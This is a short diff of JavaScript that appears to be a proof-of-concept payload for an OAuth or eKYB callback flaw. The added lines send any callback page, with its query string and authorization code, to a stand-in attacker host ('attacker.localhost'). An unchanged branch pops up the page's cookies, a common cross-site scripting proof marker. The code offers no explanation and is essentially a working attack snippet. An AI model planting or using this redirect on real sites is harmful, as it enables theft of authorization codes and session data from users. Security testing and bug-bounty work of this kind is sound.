@@ -1,6 +1,9 @@
 if (location.href.includes("/ekyb/callback?code=1234567")) {
   window.location.replace("https://example.com" + location.search);
-} else {
+} else if (location.href.includes("/ekyb/callback")) {
+  window.location.replace("http://attacker.localhost" + location.search);
+}
+else {
   prompt(document.cookie)
 }
 
